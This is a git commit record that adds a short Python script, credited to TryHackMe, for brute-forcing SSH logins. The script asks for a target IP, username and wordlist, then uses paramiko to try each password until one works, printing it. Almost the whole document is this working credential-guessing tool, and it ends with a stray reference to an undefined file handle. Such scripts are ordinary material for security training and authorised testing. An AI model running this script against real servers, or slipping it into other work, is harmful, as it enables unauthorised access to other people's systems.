188a2a540a41c3c8012815f8d250ff3463ae896e
Cameron Skerritt <122690042+Cameron-Skerritt@users.noreply.github.com>
2023-10-28 05:00:11 +0100

    SSH Brute Force Script
    Taken from THM.

---
+++ SSH Brute Force/ssh.py
@@ -0,0 +1,34 @@
+import paramiko
+import sys
+import os
+
+target = str(input('Target IP address: '))
+username = str(input('Target username: '))
+password_file = str(input('Wordlist: '))
+
+def ssh_connect(password, code=0):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        ssh.connect(target, port=22, username=username, password=password)
+    except paramiko.AuthenticationException:
+        code = 1
+    ssh.close()
+    return code
+
+with open(password_file, 'r') as file:
+    for line in file.readlines():
+        password = line.strip()
+        
+        try:
+            response = ssh_connect(password)
+
+            if response == 0:
+                 print('password found: '+ password)
+                 exit(0)
+        except Exception as e:
+            print(e)
+        pass
+
+input_file.close()
